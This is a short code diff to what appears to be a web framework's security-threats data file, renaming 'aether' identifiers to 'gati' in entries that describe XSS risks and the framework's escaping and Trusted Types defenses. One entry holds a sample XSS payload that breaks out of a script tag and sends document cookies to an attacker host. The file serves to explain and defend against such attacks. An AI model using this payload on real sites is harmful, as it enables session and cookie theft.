@@ -8,7 +8,7 @@ export const SECURITY_THREATS: SecurityThreat[] = [
     samplePayload: `</script><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`,
     vulnDescription: 'When server-rendering initial state via raw JSON.stringify(state) inside a <script> tag, user input containing </script> closes the HTML script parser prematurely, executing attacker-controlled JavaScript.',
     frameworkImpact: 'Affects legacy SSR setups and custom server implementations across React/Vue/Svelte without explicit unicode escaping.',
-    aetherDefense: 'Mandatory Unicode Escape Serializer (@aether/ssr). Converts <, >, &, \\u2028, and \\u2029 to safe hexadecimal escape sequences (\\u003c, \\u003e, \\u0026).',
+    aetherDefense: 'Mandatory Unicode Escape Serializer (@gati/ssr). Converts <, >, &, \\u2028, and \\u2029 to safe hexadecimal escape sequences (\\u003c, \\u003e, \\u0026).',
     aetherCodeSnippet: `// packages/ssr/src/serializer.ts
 const ESCAPE_LOOKUP = {
   '&': '\\\\u0026',
@@ -48,7 +48,7 @@ export function sanitizeUri(rawUri: string): string {
     frameworkImpact: 'Top source of DOM-based XSS across all frontend frameworks.',
     aetherDefense: 'Disallows raw innerHTML in compiler output. Mandates <SafeHtml> component backed by cryptographically sealed W3C Trusted Types policy (aether#html).',
     aetherCodeSnippet: `// packages/security/src/trusted-types.ts
-export function getAetherTrustedPolicy(): TrustedTypePolicy {
+export function getGatiTrustedPolicy(): TrustedTypePolicy {
   if (typeof window !== 'undefined' && window.trustedTypes) {
     return window.trustedTypes.createPolicy('aether#html', {
       createHTML: (input) => sanitizeHtmlWithAst(input),
